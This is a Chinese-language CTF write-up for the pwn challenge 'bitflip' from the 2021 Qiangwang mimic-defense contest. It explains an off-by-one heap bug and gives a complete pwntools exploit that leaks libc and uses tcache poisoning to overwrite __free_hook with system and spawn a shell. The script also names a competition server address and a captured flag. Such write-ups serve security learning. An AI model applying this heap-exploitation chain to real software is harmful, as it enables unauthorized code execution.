# 第四届“强网”拟态防御国际精英挑战赛 2021 pwn **bitflip**

> challenge name: `bitflip`
>
> file: `bitflip`, libc-2.27.so
>
> ld.so and .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16
>

是`old_school`的进阶版，也是在edit操作中存在Off-By-One漏洞，create时要求size最大为0x50，这个大小在tcache被填满之后，会进入到fastbin而不会进入到unsorted bin。所以要用Off-By-One改大size域，使得chunk可以进入unsorted bin，其余过程则与`old_school`类似，即拿到一个chunk，这个chunk是可以控制一个在tcache中的chunk的fw域的。最后做tcache poisoning

注意事项：改size时，要注意size大小可能导致unsorted bin有关的安全检查过不了

内存布局+思路：

```python
c1(0x40)
c2(0x40) # 利用c1把c2的size改大(0xa1)，设法把c2放入unsortedbin里
c3(0x30) # 放到tcache(0x30)里，要为第一个chunk，即要最后free # tcache(0x30) cnt=2: c3->c4
c4(0x30) # 陪着c3进tcache(0x30)，只是为了增大tcache(0x30)的cnt为2
# 两个两个malloc，malloc 7 对 chunk(14个)，用前一个chunk改大下一个chunk的size为0xa1
# 把size改为0xa1的chunk释放，填满tcache(0xa0)
# 释放c2，c2进入unsorted bin: 0xa0
# malloc(0x40) 把c2 拿回来，unsorted bin中还有一个 0x60 的chunk
# malloc(0x30) 再从unsorted bin拿一个0x30的chunk，其实这个就是c3了，然后就可以编辑c3的fw
```

一句话概括：把一个chunk的size改大，释放到unsorted bin的时候把一个在tcache中的chunk给“顺”进unsorted bin了，然后就可以拿回来任意编辑。

> 注意这里的描述与exp中的有些许出入，exp中有的chunk是无用的，做了一些没有必要的操作。

# IDA Analysis

- create: idx<= 0x1f; size<=0x50。这个size在tcache填满时，放入fastbin
- edit: size为0x28, 0x38, ...时，可以覆盖下一chunk的size的最低1B为任意数字，即存在Off-By-One

```cpp
unsigned __int64 edit()
{
  unsigned __int64 idx_ori; // rbx
  __int64 size_ori; // rbp
  _BYTE *ptr; // rbx
  __int64 size_plus1; // rbp
  _BYTE *end_addr; // rbp
  unsigned __int64 temp; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v7; // [rsp+8h] [rbp-20h]

  v7 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf(&ald, &temp);
  idx_ori = temp;
  if ( temp <= 0x1F )
  {
    if ( arrPtr[temp] )
    {
      __printf_chk(1LL, "Content: ");
      size_ori = arrSize[idx_ori];
      ptr = (_BYTE *)arrPtr[idx_ori];
      size_plus1 = size_ori + 1;
      if ( size_plus1 )
      {
        end_addr = &ptr[size_plus1];
        do
        {
          read(0, ptr, 1uLL);   // 可以编辑ptr[size]所在的byte 即多写1B任意字符，Off-By-One
          if ( *ptr == '\n' )
            break;
          ++ptr;
        }
        while ( ptr != end_addr ); // ptr[size+1]
      }
    }
  }
  return __readfsqword(0x28u) ^ v7;
}
```



# exp

c0是没用的，debug时遗留的罢了。c5是不必的，因为后面只从tcache(0x30)中malloc了两次。

```python
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
IP = "124.71.130.185"
PORT = 49154
DEBUG = 1


if DEBUG:
    p = process(["./ld.so", "./bitflip"], env={"LD_PRELOAD": "./libc-2.27.so"})
    libc = ELF("./libc-2.27.so")
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[1].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())

else:  # flag{2296341872d87bd532c121d14d55c4ac}
    p = remote(IP, PORT)
    libc = ELF("./libc-2.27.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        # cmd += "b *%d\n" % (base + 0xC0E)  #
        cmd += "set $a=%d\n" % (base + 0x202160)  # arrPtr
        debug(cmd)


def create(idx, size):
    sla("Your choice: ", str(1))
    sla("Index: ", str(idx))  # max: 0x1F # 0~32
    sla("Size: ", str(size))  # max: 0x50
    ru("Done!")


def edit(idx, content):
    sla("Your choice: ", str(2))
    sla("Index: ", str(idx))
    sa("Content: ", content)


def show(idx):
    sla("Your choice: ", str(3))
    sla("Index: ", str(idx))
    ru("Content: ")
    return ru("\n1. BF create")[:-13]


def remove(idx):
    sla("Your choice: ", str(4))
    sla("Index: ", str(idx))


# === Step-1: prepare a chunk(0xa0), tcache(0x30) cnt=3
create(0, 0x38)
edit(0, "chunk0".ljust(0x47, '0') + '\n')
create(1, 0x38)
create(2, 0x38)  # c2 size=0x40
edit(1, "to_unsorted_bin".ljust(0x38, 'a') + chr(0xa1))  # Off-By-One # c2 size=0xa0
# prepare tcache(0x30) for tcache poisoning in last step
# c3将被放到tcache(0x30)的头部，同时被c2“顺”进unsorted_bins
create(3, 0x28)  # c3 0x30 # covered by c2 
create(4, 0x28)  # c4 0x30 # covered by c2
create(5, 0x28)  # c5 0x30 # NOT covered by c2
remove(5)
remove(4)
remove(3)  # tcache(0x30)cnt3: c3, c4, c5

# === Step-2: full tcache(0xa0), a chunk to unsorted bin
for i in range(6, 19, 2):  # tcache(0x40)
    print("i=", i)
    create(i, 0x38)      # 6, 8, 10, 12, 14, 16, 18
    create(i + 1, 0x38)  # 7, 9, 11...
    edit(i, "toEditNextChunk".ljust(0x38, '0') + chr(0xa1))

for i in range(19, 6, -2):
    print("free i=", i)  # 19, 17, ... 7
    remove(i)  # full tcache(0xa0)
remove(2)  # c2 to unsorted bin
# tcache(0xa0)cnt=7: c7, c9, .. c19 # unsorted_bin cnt=1: 0xa0

# === Step-3: get chunk(size=0x40) from unsorted bin, 0x60 left; leak libc addr
create(2, 0x38)
data = show(2)
print("data:", data, data.hex())
temp = u64(data.ljust(8, b"\x00"))
libc.address = temp - 0x7f7669cc7d30 + 0x00007f76698dc000
print("libc.address:", libc.address, hex(libc.address), hex(temp))
dd()

# tcache(0xa0)cnt=7 # tcache(0x40)cnt=3: c3, c4, c5 # unsorted_bins 0x60
# === Step-4: get chunk(0x50) from unsorted bin, also c3
create(22, 0x48)  # unsorted_bins cnt=1: 0x20
edit(22, p64(libc.symbols["__free_hook"]) + b'\n')  # cover c3 fw with &__free_hook
create(23, 0x28)  # get c3 from tcache(0x30) # tcache(0x30)cnt=2: &__free_hook
create(24, 0x28)  # get &__free_hook
edit(24, p64(libc.symbols["system"]) + b'\n')  # cover __free_hook with system
edit(23, "/bin/sh\x00\n")
remove(23)  # system("/bin/sh\x00\n")


p.interactive()

```

